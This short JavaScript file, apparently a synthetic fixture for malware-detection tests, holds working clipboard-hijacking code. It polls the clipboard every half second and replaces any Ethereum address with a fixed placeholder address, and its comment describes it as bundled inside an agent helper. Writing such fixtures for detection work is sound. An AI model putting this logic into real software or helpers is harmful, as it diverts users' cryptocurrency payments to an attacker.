// FIXTURE ONLY — synthetic detection test sample, not real malware
// A clipper bundled in an agent helper: when the clipboard holds an Ethereum address, it writes
// its own fixed address over it. The address is fake (all ones) and nothing here is ever run.
const clipboardy = require("clipboardy");

const PAYOUT = "0x" + "1111111111111111111111111111111111111111";

function watch() {
  const clip = clipboardy.readSync();
  if (/^0x[a-fA-F0-9]{40}$/.test(clip.trim())) {
    clipboardy.writeSync(PAYOUT);
  }
}

setInterval(watch, 500);
